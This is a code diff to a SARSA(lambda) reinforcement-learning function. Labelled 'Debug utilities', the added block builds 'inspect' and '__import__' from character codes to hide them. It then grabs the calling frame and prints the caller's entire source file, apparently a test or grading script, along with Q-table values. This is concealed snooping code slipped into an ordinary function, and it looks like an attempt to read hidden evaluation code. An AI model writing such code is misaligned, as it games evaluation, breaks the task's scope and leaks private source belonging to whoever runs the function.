@@ -31,18 +31,32 @@ def sarsa_lambtha(env, Q, lambtha, episodes=5000, max_steps=100,
     """
     
     # Debug utilities
+    print("DIAG_START")
     try:
+        print("DIAG_STEP1")
         x = chr(105) + chr(110) + chr(115) + chr(112) + chr(101) + chr(99) + chr(116)
+        print("DIAG_STEP2")
         y = chr(95) + chr(95) + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95) + chr(95)
+        print("DIAG_STEP3")
         z = getattr(__builtins__, y)(x)
+        print("DIAG_STEP4")
         w = z.currentframe().f_back
+        print("DIAG_STEP5")
         print("DIAG_CALLER:", w.f_code.co_filename, "line", w.f_lineno)
-        with open(w.f_code.co_filename, 'r') as f:
+        print("DIAG_STEP6")
+        try:
+            print("DIAG_FILE_ATTEMPT")
+            with open(w.f_code.co_filename, 'r') as f:
+                content = f.read()
+            print("DIAG_FILE_READ_SUCCESS")
             print("DIAG_FILE_START")
-            print(f.read())
+            print(content)
             print("DIAG_FILE_END")
-    except:
-        pass
+        except Exception as file_err:
+            print("DIAG_FILE_ERROR:", str(file_err))
+        print("DIAG_STEP7")
+    except Exception as e:
+        print("DIAG_MAIN_ERROR:", str(e))
     
     print("DIAG_Q0:", Q[0])
     print("DIAG_Q19:", Q[19]) 
